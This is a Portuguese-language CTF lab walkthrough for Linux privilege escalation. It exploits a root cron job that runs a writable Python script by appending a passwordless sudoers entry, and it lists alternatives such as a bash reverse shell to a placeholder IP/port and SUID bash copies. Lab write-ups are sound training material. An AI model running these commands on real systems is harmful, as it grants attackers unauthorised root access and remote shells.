# Roadmap metodológico — Privesc Linux - 2

## 1. Acesso inicial

- Credenciais fornecidas pelo lab: `ctfplayer:ctfplayer2026`
- Conexão via SSH
- Objetivo: enumerar e encontrar vetores de lateral movement / privesc

## 2. Enumeração pós-acesso (ctfplayer)

```bash
ls -la
ls -la .config/
ls -la .config/app/
cat .config/app/.credentials.bak
```

- Foco: arquivos ocultos, backups, notas, histórico, scripts
- Resultado: credencial de `sysadmin` em `.credentials.bak`

## 3. Movimentação lateral

```bash
su sysadmin
cd ~
ls
cat user.txt
cat notes.txt
```

- Flag de usuário obtida
- `notes.txt` revela a existência do backup automático em `/opt/scripts` e o log em `/var/log/backup.log`

## 4. Enumeração de privesc

```bash
ls -la /opt/scripts/
cat /opt/scripts/backup.py
ls -la /var/log/backup.log
# Verificar cron (root ou sistema)
cat /etc/crontab
ls /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
```

- Confirmar que o script é executado periodicamente com privilégios elevados
- Confirmar que o usuário atual consegue escrever no script

## 5. Exploração

Substituir o conteúdo de `backup.py` por:

```python
import os
os.system("echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
```

- Aguardar execução do cron (~1 minuto)
- Validar:

```bash
sudo -l
sudo su
whoami
cat /root/root.txt
```

## 6. Alternativas de exploração (não usadas, mas válidas)

- Reverse shell no script (`os.system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")`)
- Adicionar SUID em binário
- Copiar `/bin/bash` e setar SUID
- Escrever em outros arquivos críticos se o contexto permitir

## 7. Pós-exploração

- Coletar flags
- Documentar vetor (cron + writable script → sudoers)
- Limpar artefatos se necessário (opcional em lab)
